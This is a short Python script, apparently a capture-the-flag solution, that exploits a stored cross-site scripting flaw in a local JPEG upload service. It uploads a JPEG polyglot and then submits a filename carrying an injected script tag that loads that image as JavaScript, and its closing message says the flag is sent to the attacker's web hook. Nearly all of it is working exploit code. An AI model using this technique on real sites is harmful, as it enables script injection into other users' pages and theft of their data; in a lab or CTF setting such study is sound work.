import requests
import urllib.parse as parse

TARGET = 'http://localhost:4243'
PAYLOAD = '</h3><script charset="ISO-8859-1" src="{path}"></script><h3>'

def main():
    # Upload the payload JPEG that will interpreted as a javascript to exploit the XSS vuln
    with open("payload.jpg", "rb") as f:
        r = requests.post(TARGET + '/api/jpegs/submit?name=stage1', files={"file": f})
    
    payload_path = r.json()['value']['path']

    p = parse.quote_plus(PAYLOAD.format(path = payload_path))

    # Trigger the XSS vuln by setting the source as the file that was previously uploaded
    with open("payload.jpg", "rb") as f:
        r = requests.post(TARGET + '/api/jpegs/submit?name=' + p, files={"file": f})

    print("Check your web hook for the flag to be sent to it!")

if __name__ == "__main__":
    main()